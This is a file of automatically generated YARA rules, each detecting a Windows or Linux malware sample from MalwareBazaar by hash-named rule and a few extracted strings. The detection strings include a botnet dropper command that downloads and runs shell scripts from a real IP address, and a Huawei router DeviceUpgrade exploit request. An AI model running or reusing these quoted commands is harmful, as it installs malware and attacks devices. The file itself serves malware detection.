rule Windows_7799e9fb86d120ff1daa0bee482bfa2cb4e32071c2ee15f5d48b981126890baf
{
    meta:
        description = "Auto ML: 7799e9fb86d120ff1daa0bee482bfa2cb4e32071c2ee15f5d48b981126890baf"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.data"
        $s3 = "MSVBVM60.DLL"
        $s4 = "Install, Setup or Update"
        $s5 = "CoolerBar"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 5252KB
        and all of them
}

rule Windows_77d2129f3e711b02b280dc1ebbd724abd4091818b49c40a2c984835be121b993
{
    meta:
        description = "Auto ML: 77d2129f3e711b02b280dc1ebbd724abd4091818b49c40a2c984835be121b993"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "#Strings"
        $s5 = "<>c__DisplayClass50_0"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1113KB
        and all of them
}

rule Windows_77d43860b95e6d41136e4f6e25e9517e9eb15d0b4bf02dde3ffe7a1e5b421a8d
{
    meta:
        description = "Auto ML: 77d43860b95e6d41136e4f6e25e9517e9eb15d0b4bf02dde3ffe7a1e5b421a8d"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "@.reloc"
        $s5 = "SVWu:ff"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1672KB
        and all of them
}

rule Windows_781fecd030f2f437a89dcf726a45e3eed218043316b35e80770a20a6f4bb62e4
{
    meta:
        description = "Auto ML: 781fecd030f2f437a89dcf726a45e3eed218043316b35e80770a20a6f4bb62e4"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "#Strings"
        $s5 = "label10"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 976KB
        and all of them
}

rule Windows_7857094a95ad2877190acd4130d25048a609706ceac62eda44eadc5f6408723f
{
    meta:
        description = "Auto ML: 7857094a95ad2877190acd4130d25048a609706ceac62eda44eadc5f6408723f"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "RichkN"
        $s3 = "`.rdata"
        $s4 = "@.data"
        $s5 = "@.reloc"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 798KB
        and all of them
}

rule Windows_785b701ae714b1e202d2435201c2ee0644e1523ffd691f9c878b859125ee779b
{
    meta:
        description = "Auto ML: 785b701ae714b1e202d2435201c2ee0644e1523ffd691f9c878b859125ee779b"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "h\"l yZ"
        $s3 = "RichaZ"
        $s4 = "`.rdata"
        $s5 = "@.data"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1782KB
        and all of them
}

rule Windows_78b9b7acb9b0da02b05f2532f4f0ab40850e380c494fbd246451a2c18e633240
{
    meta:
        description = "Auto ML: 78b9b7acb9b0da02b05f2532f4f0ab40850e380c494fbd246451a2c18e633240"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "This program must be run under Win32"
        $s2 = ".rdata"
        $s3 = "P.reloc"
        $s4 = "P.rsrc"
        $s5 = "string"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 6258KB
        and all of them
}

rule Linux_78e2bcf05f0e99561b76bc934fb02c25583201e537565e2e8399912e25a51447
{
    meta:
        description = "Auto ML: 78e2bcf05f0e99561b76bc934fb02c25583201e537565e2e8399912e25a51447"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "/proc/net/route"
        $s2 = "(null)"
        $s3 = "Self Rep Fucking NeTiS and Thisity 0n Ur FuCkInG FoReHeAd We BiG L33T HaxErS"
        $s4 = "/usr/bin/apt-get"
        $s5 = "Ubuntu"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 84KB
        and all of them
}

rule Windows_78f0c58096e37b9e14c75dee438adab06ea191ac76ee521862663db2331b8a4f
{
    meta:
        description = "Auto ML: 78f0c58096e37b9e14c75dee438adab06ea191ac76ee521862663db2331b8a4f"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "This program must be run under Win32"
        $s2 = "`.itext"
        $s3 = "`.data"
        $s4 = ".rdata"
        $s5 = "@.reloc"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1291KB
        and all of them
}

rule Windows_0b709c39682a018b6bd85b2904e6eea608119251c72a3d9ec542d0a9acb73b58
{
    meta:
        description = "Auto ML: 0b709c39682a018b6bd85b2904e6eea608119251c72a3d9ec542d0a9acb73b58"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "dSiz%PDF-"
        $s5 = "Qkkbal"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 8959KB
        and all of them
}

rule Windows_792da83612534b65156bbeb82f175987cd969bee28f7c685623048b75a1e0c98
{
    meta:
        description = "Auto ML: 792da83612534b65156bbeb82f175987cd969bee28f7c685623048b75a1e0c98"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".helero"
        $s5 = "HHtXHHt"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 290KB
        and all of them
}

rule Windows_79658843a0028941539f3b437a8d262c78b15e6e58f4b1f7b96bf357b06fa84f
{
    meta:
        description = "Auto ML: 79658843a0028941539f3b437a8d262c78b15e6e58f4b1f7b96bf357b06fa84f"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "#Strings"
        $s5 = "btnThem_Click_1"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 785KB
        and all of them
}

rule Windows_797db6f65c21cb64c040a4067ced07167aa3ebf863757e22d18d50df60b6ef2f
{
    meta:
        description = "Auto ML: 797db6f65c21cb64c040a4067ced07167aa3ebf863757e22d18d50df60b6ef2f"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "InnolZJ"
        $s2 = "This program must be run under Win32"
        $s3 = ".rdata"
        $s4 = "P.reloc"
        $s5 = "P.rsrc"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1496KB
        and all of them
}

rule Windows_799bf4e7659863f98669b2fb8e7d83c40b51381018a1d8486e7fe9ccb3705157
{
    meta:
        description = "Auto ML: 799bf4e7659863f98669b2fb8e7d83c40b51381018a1d8486e7fe9ccb3705157"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "#Strings"
        $s5 = "<ConnectToClient>b__48_10"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 52KB
        and all of them
}

rule Windows_79ad3b97b133a46650bd4e9243585e619cb2225a05d8dede6d1aa78a6a54bf19
{
    meta:
        description = "Auto ML: 79ad3b97b133a46650bd4e9243585e619cb2225a05d8dede6d1aa78a6a54bf19"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "#Strings"
        $s5 = "Action`10"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 194KB
        and all of them
}

rule Windows_79e7c800173c86dde9b525ba038c3b41d7724ff1d5d692c1652d748e2e3d34a0
{
    meta:
        description = "Auto ML: 79e7c800173c86dde9b525ba038c3b41d7724ff1d5d692c1652d748e2e3d34a0"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".didat"
        $s5 = "@.reloc"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 559KB
        and all of them
}

rule Linux_79ebb17616415d931b650b87f4fca70ddb899b21cb60783cfcf4b53068398350
{
    meta:
        description = "Auto ML: 79ebb17616415d931b650b87f4fca70ddb899b21cb60783cfcf4b53068398350"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "SNQUERY: 127.0.0.1:AAAAAA:xsvr"
        $s2 = "M-SEARCH * HTTP/1.1"
        $s3 = "HOST: 255.255.255.255:1900"
        $s4 = "MAN: \"ssdp:discover\""
        $s5 = "ST: urn:dial-multiscreen-org:service:dial:1"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 199KB
        and all of them
}

rule Windows_7a66c663f71aff27ef5671579fd986b30c9527e23da7cbcfe7cdad8bf8baf739
{
    meta:
        description = "Auto ML: 7a66c663f71aff27ef5671579fd986b30c9527e23da7cbcfe7cdad8bf8baf739"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "lSystem.Resources.ResourceReader, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089#System.Resources.RuntimeResourceSet"
        $s5 = "PADPADPf"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1036KB
        and all of them
}

rule Windows_7a7126809eaa8ce5576ffd8d1caeed0dffaa34d41e7e435ccbfb382dbffc4ab5
{
    meta:
        description = "Auto ML: 7a7126809eaa8ce5576ffd8d1caeed0dffaa34d41e7e435ccbfb382dbffc4ab5"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "`.reloc"
        $s5 = "@.rsrc"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 3059KB
        and all of them
}

rule Linux_7a8f416df448f1aea65a6e18bcbc97371265fad81aa8c0292de46bc9504b953c
{
    meta:
        description = "Auto ML: 7a8f416df448f1aea65a6e18bcbc97371265fad81aa8c0292de46bc9504b953c"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "POST /ctrlt/DeviceUpgrade_1 HTTP/1.1"
        $s2 = "Content-Length: 430"
        $s3 = "Connection: keep-alive"
        $s4 = "Accept: */*"
        $s5 = "Authorization: Digest username=\"dslf-config\", realm=\"HuaweiHomeGateway\", nonce=\"88645cefb1f9ede0e336e3569d75ee30\", uri=\"/ctrlt/DeviceUpgrade_1\", response=\"3612f843a42db38f48f59d2a3597e19c\", algorithm=\"MD5\", qop=\"auth\", nc=00000001, cnonce=\"248d1a2560100669\""

    condition:
        uint32(0) == 0x464c457f and
        filesize < 81KB
        and all of them
}

rule Linux_0b7d9d7df4974b15b2fa52a11214937fc5569c47edb2e42034c4e56929380a72
{
    meta:
        description = "Auto ML: 0b7d9d7df4974b15b2fa52a11214937fc5569c47edb2e42034c4e56929380a72"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "cd /tmp; wget http://45.90.217.165/bins.sh; chmod 777 *; sh bins.sh; tftp -g 45.90.217.165 -r tftp.sh; chmod 777 *; sh tftp.sh; rm -rf *.sh"
        $s2 = "ad34334in"
        $s3 = "us534534534er"
        $s4 = "lo54345534gin"
        $s5 = "ge534345345st"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 108KB
        and all of them
}

rule Windows_7b07b7286d9841bbbd2435649044e799e87ee63173b8ae96f6f8d9f82d486f0a
{
    meta:
        description = "Auto ML: 7b07b7286d9841bbbd2435649044e799e87ee63173b8ae96f6f8d9f82d486f0a"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "G:CvfV"
        $s3 = "\\,VTbm"
        $s4 = "k%jPJo"
        $s5 = "s.f}db"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 478KB
        and all of them
}

rule Windows_7b3c1e60932c652fc591de285279cbdfb7292b54899842ea5c627fedc7cee8ab
{
    meta:
        description = "Auto ML: 7b3c1e60932c652fc591de285279cbdfb7292b54899842ea5c627fedc7cee8ab"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "ZXIS8("
        $s4 = "ZXIS8r"
        $s5 = "ZXIS8Z"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 5160KB
        and all of them
}

rule Windows_7b7049c7a1115aab1f89f2f106deeff2722da854339e91c2de0a1ffbf47a79a4
{
    meta:
        description = "Auto ML: 7b7049c7a1115aab1f89f2f106deeff2722da854339e91c2de0a1ffbf47a79a4"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "!UUUUUUUU"
        $s5 = "hXhS+^"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 3190KB
        and all of them
}

rule Windows_7b9502c277114c4c5cde1d0ce893041f2a880ce2808855ec74faf47485660d51
{
    meta:
        description = "Auto ML: 7b9502c277114c4c5cde1d0ce893041f2a880ce2808855ec74faf47485660d51"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "G\"o[Nh0"
        $s5 = "5544FSGYA08UTEO745GFAD"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 647KB
        and all of them
}

rule Windows_7b97762fc9c518b1b82275e483664a83b23fb7ff33535798b2afb28071581f16
{
    meta:
        description = "Auto ML: 7b97762fc9c518b1b82275e483664a83b23fb7ff33535798b2afb28071581f16"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "S>tRich"
        $s3 = "`.rdata"
        $s4 = "@.data"
        $s5 = "@.rsrc"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 207KB
        and all of them
}

rule Windows_7baf84b2dc1ef0c69fd51ab29dafe3645c7f8dce60b2f18022ec5270f13a1e2a
{
    meta:
        description = "Auto ML: 7baf84b2dc1ef0c69fd51ab29dafe3645c7f8dce60b2f18022ec5270f13a1e2a"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "!UUUUUUUU"
        $s5 = "hXhS+^"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 3190KB
        and all of them
}

rule Windows_7bc78ae29f7bd99effbd39d5b86be6cbd1928affcddf0e3405d01d8292cc4bac
{
    meta:
        description = "Auto ML: 7bc78ae29f7bd99effbd39d5b86be6cbd1928affcddf0e3405d01d8292cc4bac"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".wares"
        $s5 = "0WWWWW"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 229KB
        and all of them
}

rule Windows_7c8df85e9bea7559e0addd33afc5273e49eb863c4c15f6c4c7d3fbae3eb3c55c
{
    meta:
        description = "Auto ML: 7c8df85e9bea7559e0addd33afc5273e49eb863c4c15f6c4c7d3fbae3eb3c55c"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "#Strings"
        $s5 = "Form01"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 536KB
        and all of them
}

rule Windows_7ca9bc15fa33dc0cccc239679bca74cafd96ef9994eb362d57006dcac86b3709
{
    meta:
        description = "Auto ML: 7ca9bc15fa33dc0cccc239679bca74cafd96ef9994eb362d57006dcac86b3709"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "G:CvfV"
        $s3 = "\\,VTbm"
        $s4 = "k%jPJo"
        $s5 = "s.f}db"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 616KB
        and all of them
}

rule Linux_7caed28559989416f8b853ae4b5e5604ef41077e711f61e5f10a2f5ec9ff9632
{
    meta:
        description = "Auto ML: 7caed28559989416f8b853ae4b5e5604ef41077e711f61e5f10a2f5ec9ff9632"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "viwQ6L@"
        $s2 = "rG:D8gY["
        $s3 = "i]Ym}B"
        $s4 = "h*PG^Z"
        $s5 = "*&iJm3>Q"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 29KB
        and all of them
}

rule Windows_0b8b6ae77cdc328f081d5cd1a545fee1487adf46b58845526f8c7314a64500c7
{
    meta:
        description = "Auto ML: 0b8b6ae77cdc328f081d5cd1a545fee1487adf46b58845526f8c7314a64500c7"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "c f7Aja}K"
        $s5 = "#Strings"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1895KB
        and all of them
}

rule Windows_7cfbfe371912b59dec9a22cb39790c9f94774124ac786b48d493ec46830a0c1c
{
    meta:
        description = "Auto ML: 7cfbfe371912b59dec9a22cb39790c9f94774124ac786b48d493ec46830a0c1c"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "@.reloc"
        $s5 = "WWjdh,"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1537KB
        and all of them
}

rule Windows_7d0eb3e819a8aad18bdcdf7f212c77663a79b3d048636878655dbe3730ff82ea
{
    meta:
        description = "Auto ML: 7d0eb3e819a8aad18bdcdf7f212c77663a79b3d048636878655dbe3730ff82ea"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".julucu"
        $s5 = "0WWWWW"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 207KB
        and all of them
}

rule Windows_7d41863d2e5ab0680309cb11248c4b8dea0cf129aeab87a96eb0ccdccd634156
{
    meta:
        description = "Auto ML: 7d41863d2e5ab0680309cb11248c4b8dea0cf129aeab87a96eb0ccdccd634156"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "#Strings"
        $s5 = "label10"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 632KB
        and all of them
}

rule Windows_7d83a92926f6caf31b31a57f3fd55bff1105f3dac0d686847556149067897e55
{
    meta:
        description = "Auto ML: 7d83a92926f6caf31b31a57f3fd55bff1105f3dac0d686847556149067897e55"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "#Strings"
        $s5 = "DF51EFD36C8F552B80C9E2B91433E8C96D4C4CBE3068D8D13405DB1020381641"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 605KB
        and all of them
}

rule Linux_7d9e2013c4e402f0a690c35879cc45482dd6daccfeb055f8f90738b51fcb47c2
{
    meta:
        description = "Auto ML: 7d9e2013c4e402f0a690c35879cc45482dd6daccfeb055f8f90738b51fcb47c2"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "[lFnqP"
        $s2 = "GEc!Y/Yh"
        $s3 = "MI:h~w"
        $s4 = "N=agJ<"
        $s5 = ";{\"is]Rjn"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 28KB
        and all of them
}

rule Windows_7d9ec2e09c8559b1d695569da5f16b9a6edd54c38526b91d458ca5c43c401761
{
    meta:
        description = "Auto ML: 7d9ec2e09c8559b1d695569da5f16b9a6edd54c38526b91d458ca5c43c401761"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.sdata"
        $s3 = "@.reloc"
        $s4 = "d UUUU_`"
        $s5 = "lZ[YZ*"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1564KB
        and all of them
}

rule Windows_7da786b32ec861208fc6a01b94d4eee4867b26dabfe214b66c9009b2f0222050
{
    meta:
        description = "Auto ML: 7da786b32ec861208fc6a01b94d4eee4867b26dabfe214b66c9009b2f0222050"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "lSystem.Resources.ResourceReader, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089#System.Resources.RuntimeResourceSet"
        $s5 = "PADPADP"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 4754KB
        and all of them
}

rule Windows_7dca5662fe7621ffd890ac202dd50e9d22b8f2ca186490ad62d8813cc0727cdb
{
    meta:
        description = "Auto ML: 7dca5662fe7621ffd890ac202dd50e9d22b8f2ca186490ad62d8813cc0727cdb"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "D@xw7W"
        $s5 = "lSystem.Resources.ResourceReader, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089#System.Resources.RuntimeResourceSet"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1124KB
        and all of them
}

rule Linux_7df2b3290cd7f892dbec1ed745f6bad48adf0fb0f6c7137d93aab754e74cea80
{
    meta:
        description = "Auto ML: 7df2b3290cd7f892dbec1ed745f6bad48adf0fb0f6c7137d93aab754e74cea80"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "7SciXht9lw41x8Jx2aWP/arwfzx_ZUIRZF3gQlCqf/B8EEl0rMTDbd-pSqLnIT/z_99FvQZyHn3Bwd-Muxg"
        $s2 = "8cpu.u"
        $s3 = "UUUUUUUUH!"
        $s4 = "D$xH9P@w"
        $s5 = "t*H9HPt$"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 3676KB
        and all of them
}

rule Windows_7e18416de1803f8e39a3f4459532f5debeeb67d0d7e497b64b23de4cf698c062
{
    meta:
        description = "Auto ML: 7e18416de1803f8e39a3f4459532f5debeeb67d0d7e497b64b23de4cf698c062"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "d UUUU_`"
        $s5 = "lZ[YZ*"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 893KB
        and all of them
}

rule Linux_0bb44293af42319e7124a88763f58246706cdcc2c299b6d8eb6c4d0b37fef574
{
    meta:
        description = "Auto ML: 0bb44293af42319e7124a88763f58246706cdcc2c299b6d8eb6c4d0b37fef574"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!mcjbg`k"
        $s2 = "!~|am!`kz!zm~"
        $s3 = "FA}g`qw2W|u{|w2Cgw`k"
        $s4 = "!jkx!yozmfjai"
        $s5 = "!jkx!cg}m!yozmfjai"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 62KB
        and all of them
}

rule Linux_7e27dd01bf2a1d8c2cfb8b5e19b9d2ceb9e2fbfc5bb7a65eb1a487b42a1c256c
{
    meta:
        description = "Auto ML: 7e27dd01bf2a1d8c2cfb8b5e19b9d2ceb9e2fbfc5bb7a65eb1a487b42a1c256c"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "HFu8sfga"
        $s2 = "XM`h5p"
        $s3 = "wHA{Kc"
        $s4 = "k0<K@Ys"
        $s5 = "^o>sXHd"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 40KB
        and all of them
}

rule Linux_7e455b30878e3e01139eb0e29725ac81f19590d1b47eaedb780146196578cb4f
{
    meta:
        description = "Auto ML: 7e455b30878e3e01139eb0e29725ac81f19590d1b47eaedb780146196578cb4f"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "POST /cdn-cgi/"
        $s2 = "HTTP/1.1"
        $s3 = "User-Agent:"
        $s4 = "Cookie:"
        $s5 = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ012345678"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 146KB
        and all of them
}

rule Windows_7e924017dc6019c756ee6dd390babd32bef51fc7aa0722c18a65b8d2260056d6
{
    meta:
        description = "Auto ML: 7e924017dc6019c756ee6dd390babd32bef51fc7aa0722c18a65b8d2260056d6"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "com.apple.Safari"
        $s5 = "Unable to resolve HTTP prox"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 239KB
        and all of them
}

rule Linux_7ec06a47b317f5f00788b245b48b893c59420315002d03f943578bb5ab1b4be7
{
    meta:
        description = "Auto ML: 7ec06a47b317f5f00788b245b48b893c59420315002d03f943578bb5ab1b4be7"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "SNQUERY: 127.0.0.1:AAAAAA:xsvr"
        $s2 = "M-SEARCH * HTTP/1.1"
        $s3 = "HOST: 255.255.255.255:1900"
        $s4 = "MAN: \"ssdp:discover\""
        $s5 = "ST: urn:dial-multiscreen-org:service:dial:1"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 59KB
        and all of them
}

